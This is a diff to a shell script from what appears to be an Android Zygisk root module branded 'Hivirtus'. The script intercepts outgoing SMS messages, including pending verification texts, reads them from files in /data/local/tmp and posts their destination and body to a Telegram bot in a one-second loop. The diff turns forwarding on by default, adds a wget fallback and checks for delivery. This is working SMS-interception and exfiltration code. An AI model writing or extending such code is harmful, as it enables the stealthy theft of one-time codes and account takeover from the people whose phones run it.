@@ -219,12 +219,28 @@ read_tg_creds() {
   TG_CHAT=""
   for f in /data/local/tmp/hivirtus_telegram_credentials.json \
     "$MODDIR/telegram_credentials.json" \
+    /data/local/tmp/hivirtus_ui_save.json \
     "$RUNTIME" "$CONFIG"; do
     [ -f "$f" ] || continue
     [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
   done
+}
+
+tg_forward_enabled() {
+  # Default ON jab token+chat set ho; UI toggle off ho to skip
+  local src=""
+  [ -f "$RUNTIME" ] && src="$RUNTIME"
+  [ -z "$src" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ] && src=/data/local/tmp/hivirtus_ui_save.json
+  [ -z "$src" ] && [ -f "$CONFIG" ] && src="$CONFIG"
+  [ -z "$src" ] && return 0
+  if grep -q '"auto_forward_token"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
+     grep -q '"fake_intercept_telegram"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
+     grep -q '"telegram_enabled"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null; then
+    return 1
+  fi
+  return 0
 }
 
 read_blocked_sms() {
@@ -238,6 +254,14 @@ read_blocked_sms() {
     BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
     BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
   fi
+  # Fallback pending_verify.json
+  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_pending_verify.json ]; then
+    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
+  fi
+  # Clean placeholder
+  [ "$BLOCKED_DEST" = "INTERCEPT" ] && BLOCKED_DEST=""
+  [ "$BLOCKED_BODY" = "BLOCKED" ] && BLOCKED_BODY=""
 }
 
 tg_json_escape() {
@@ -245,42 +269,65 @@ tg_json_escape() {
 }
 
 tg_clip_copy() {
-  printf '%s' "$1" | head -c 256
+  printf '%s' "$1" | head -c 350
 }
 
 forward_blocked_telegram() {
   read_blocked_sms
+  [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
   [ -z "$BLOCKED_BODY" ] && return 0
+  tg_forward_enabled || return 0
   read_tg_creds
   [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
-  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
-  [ -z "$SPOOF" ] && SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-  SEND_FROM="${SPOOF:-—}"
-  TEXT="📱 SMS Intercepted
-Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥
------------------
-To:
-${BLOCKED_DEST}
 
-Message:
-${BLOCKED_BODY}"
-  ONE_TAP="${BLOCKED_DEST} | ${BLOCKED_BODY}"
+  TO_NUM="$BLOCKED_DEST"
+  [ -z "$TO_NUM" ] && TO_NUM="—"
+  MSG_BODY="$BLOCKED_BODY"
+  ONE_TAP="To: ${TO_NUM}
+Message: ${MSG_BODY}"
+
+  # Exact Virtus format (user screenshot)
+  TEXT="📱 SMS Intercepted Zygisk Mode
+Menu By @Hivirtus 🔥
+-----------------
+📞 To:
+${TO_NUM}
+
+💬 Message:
+${MSG_BODY}
+
+📋 One-tap copy:
+${ONE_TAP}"
+
   ESC_TEXT=$(tg_json_escape "$TEXT")
   ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
-  COPY_BODY=$(tg_clip_copy "$BLOCKED_BODY")
-  ESC_BODY=$(tg_json_escape "$COPY_BODY")
+  ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
+  ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📞 Copy To\",\"copy_text\":{\"text\":\"${ESC_TO}\"}}],[{\"text\":\"💬 Copy Message\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
   SENT=0
+  RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if command -v curl >/dev/null 2>&1; then
     curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
       -H "Content-Type: application/json" \
-      --data-binary "@${PAYLOAD}" >/dev/null 2>&1 && SENT=1
+      --data-binary "@${PAYLOAD}" > "$RESP" 2>/dev/null && SENT=1
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -O "$RESP" --timeout=25 \
+      --header="Content-Type: application/json" \
+      --post-file="$PAYLOAD" \
+      "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" 2>/dev/null && SENT=1
   fi
-  if [ "$SENT" = "1" ]; then
+  # curl may return HTTP 200 with ok:false — verify
+  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
+    rm -f /data/local/tmp/hivirtus_pending_verify.json
     rm -f "$PAYLOAD"
+    echo "tg_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+  else
+    echo "tg_fail $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   fi
 }
 
@@ -290,7 +337,7 @@ seed_apatch_config() { return 0; }
 (
   while true; do
     forward_blocked_telegram
-    sleep 2
+    sleep 1
   done
 ) &
 
